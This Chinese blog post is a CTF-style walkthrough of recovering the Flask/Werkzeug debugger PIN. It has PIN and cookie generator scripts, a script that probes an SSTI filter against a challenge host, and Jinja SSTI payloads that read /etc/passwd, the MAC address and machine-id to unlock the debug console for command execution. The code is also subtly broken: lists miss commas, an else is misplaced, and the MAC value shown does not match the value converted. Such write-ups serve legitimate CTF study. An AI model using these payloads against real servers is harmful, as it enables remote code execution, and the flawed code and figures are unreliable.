---
title: Python PIN 码
description: 学习一下PIN码
date: 2026-07-22 23:03:04
updated: 2026-07-22 23:03:04
image: /2026/Python PIN 码/cover.jpg
categories: [技术]
---

## PIN  码

Flask 里的 **PIN** 指的是：**Debugger PIN（调试器密码）**，当 Flask 开启 Debug 模式后，可以通过 PIN 码的方式进入调试模式，运行命令 。

## 环境搭建

启动一个 Flask 项目，注意要开启 debug 。

```python
from flask import Flask

app = Flask(__name__)

@app.route('/')
def hello_world():  # put application's code here
    return 'Hello World!'

if __name__ == '__main__':
    app.run(debug=True)

```

可以在终端看到 PIN 码。

```
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 454-810-314

```

然后访问 `http://127.0.0.1:5000/console` 。

## PIN  码计算

PIN 由 6 个参数计算出来。

1. `username`  运行该Flask程序的用户名，通过 `/etc/passwd` 或者 `getpass.getuser()` 读取。
2. `modname`  模块名，通过`getattr(app, "__module__", t.cast(object, app).__class__.__module__)`读取，默认是`flask.app`。
3. `appname`  app名，通过`getattr(app, "__name__", type(app).__name__)` 读取，默认是 `Flask` 。
4. `moddir`  文件路径，通过`getattr(mod, "__file__", None)` 读取，一般可以通过查看 debug 报错信息获得，Python3是 app.py，Python2 中是 app.pyc 。
5. `uuid`  电脑 mac 地址的十进制数，通过`uuid.getnode()`读取，通过文件`/sys/class/net/eth0/address`得到16进制结果，去掉 : 转化为10进制数。
6. `machine_id`  首先读取 `/etc/machine-id`，如果有值就停止 ，否则读取`/proc/sys/kernel/random/boot_id`，接着读取 `/proc/self/cgroup`，取第一行的最后一个斜杠 `/` 后面的字符串，与上面的拼接起来。

源码在`werkzeug/debug/__init__.py`，我们去看下相应的代码。前四个参数通过`get_pin_and_cookie_name` 获得。

```python
def get_pin_and_cookie_name(
    app: WSGIApplication,
) -> tuple[str, str] | tuple[None, None]:
    
    pin = os.environ.get("WERKZEUG_DEBUG_PIN")
    rv = None
    num = None

   
    if pin == "off":
        return None, None

    
    if pin is not None and pin.replace("-", "").isdecimal():
        
        if "-" in pin:
            rv = pin
        else:
            num = pin

    modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
    # 获取modname
    username: str | None

    try:
       
        username = getpass.getuser()               # 获取username
   
    except (ImportError, KeyError, OSError):
        username = None

    mod = sys.modules.get(modname)

    
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", type(app).__name__),   # 获取appname
        getattr(mod, "__file__", None),                 # 获取moddir
    ]

    
    private_bits = [str(uuid.getnode()), get_machine_id()]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode()
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name

```

PIN 码计算和 Werkzeug 的版本有关，这里有大佬写的两个版本的pin码计算脚本。

### werkzeug  1.0.x

```python
import hashlib
from itertools import chain

probably_public_bits = [
    ''#username，通过/etc/passwd
    '',#modname，默认值
    '',# 默认值
    ''# moddir，通过报错获得
]

private_bits = [
    '',  # mac十进制值 /sys/class/net/ens0/address
    ''  # 低版本直接/etc/machine-id
]

# 下面为源码里面抄的，不需要修改
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
        else:
            rv = num

print(rv)

```

### werkzeug  >=  2.0.x

```python
import hashlib
from itertools import chain

# 可能是公开的信息部分
probably_public_bits = [
    '',  # /etc/passwd
    '',  # 默认值
    '',  # 默认值
    ''  # moddir，报错得到
]

# 私有信息部分
private_bits = [
    '',  # /sys/class/net/eth0/address 十进制
    ''   # machine-id部分
]

# 创建哈希对象
h = hashlib.sha1()

# 迭代可能公开和私有的信息进行哈希计算
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)

# 加盐处理
h.update(b'cookiesalt')

# 生成 cookie 名称
cookie_name = '__wzd' + h.hexdigest()[:20]
print(cookie_name)

# 生成 pin 码
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

# 格式化 pin 码
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)


```



### cookie

有的题目可能还要拿到 cookie 才能进入 console ，有师傅分析了这个流程，给个链接`https://www.cnblogs.com/m1xian/p/18528813`，只要知道 Pin 就能算出来。

```python
import hashlib
import time


# A week
PIN_TIME = 60 * 60 * 24 * 7


def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]


print(f"{int(time.time()+10000+60 * 60 * 24 * 7)}|{hash_pin('xxx-xxx-xxx')}")

```

注意**Werkzeug > 3.0.3版本**时，仅支持回环地址或 localhost ，正常访问/console会返回400，Host 改为回环地址或者localhost 就可以访问了。

## [GYCTF2020]FlaskApp

BUUCTF 有这道题，进入环境有三个功能，加密、解密、提示，提示里面有 PIN ，是 PIN 码相关的。访问`/console` 发现确实开了 debug ，那下面就去算 PIN 。

加密功能发现不管输入啥都直接返回 base64 后的，不能 SSTI ，想到可不可以把加密后的给解密，然后注入。

这道题可以用 PIN 的做，但是有过滤，先跑一下过滤了啥。

```python
import requests
import base64


url = "https://7611fe28b1d11ee111a1384f.http-ctf2.dasctf.com/decode"


tests = [
    "{{7*7}}",
    "__class__",
    "__base__",
    "__mro__",
    "__subclasses__",
    "__globals__",
    "popen",
    "os",
    "import",
    "eval",
    "builtins",
    "cat",
    "/flag",
    "self",
    "session",
    "lipsum",
    "cycler",
    "namespace",
    "Joiner",
    "get_flashed_messages",
    "system"
]


def b64_encode(s):
    return base64.b64encode(
        s.encode()
    ).decode()


def check(keyword):

    payload = "{{" + keyword + "}}"

    # base64
    enc = b64_encode(payload)

    data = {
        "text": enc
    }


    try:
        r = requests.post(
            url,
            data=data,
            timeout=5
        )

        resp = r.text


        print("="*50)
        print("测试:", keyword)
        print("payload:", payload)
        print("base64:", enc)


        if "no" in resp.lower():
            print("[-] 被过滤")

        else:
            print("[+] 未触发过滤")


        print("响应:")
        print(resp[:100])


    except Exception as e:
        print(e)



for t in tests:
    check(t)
   
```

结果在下面：

```python
system
self
flag
eval
import
os
popen
{{7*7}}
```

然后可以用 PIN 做，解密随便输入点看下报错，路径有了`/usr/local/lib/python3.7/site-packages/flask/app.py`，

然后看 username ，这里有一个师傅的更牛的 payload ，链接`[ssti进阶({%%}控制语句,内存马) - 落山机糊人 - 博客园](https://www.cnblogs.com/lx207/articles/19322753)`。

```python
{% for x in {}.__class__.__base__.__subclasses__() %}
	{% if "warning" in x.__name__ %}
		{{x.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}
	{%endif%}
{%endfor%}
```

是 flaskweb 。

看 mac 地址。

```python
{% for x in {}.__class__.__base__.__subclasses__() %}
	{% if "warning" in x.__name__ %}
		{{x.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address').read() }}
	{%endif%}
{%endfor%}
```

是 32:22:b3:04:b3:5f ，转十进制，`int('3226cd628848',16)`，是 55142235932744。

看 machine_id 。

```python
{% for x in {}.__class__.__base__.__subclasses__() %}
	{% if "warning" in x.__name__ %}
		{{x.__init__.__globals__['__builtins__'].open('/etc/machine-id').read() }}
	{%endif%}
{%endfor%}
```

是 1408f836b0ca514d796cbf8960e45fa1 。

跑一下 PIN 。

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '55142235932744',# str(uuid.getnode()),  /sys/class/net/eth0/address
    '1408f836b0ca514d796cbf8960e45fa1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)


```

 得到 154-227-144 ，进入 console，命令执行就行。当然，拿到过滤信息也可以直接构造绕过，这里不再放 payload 。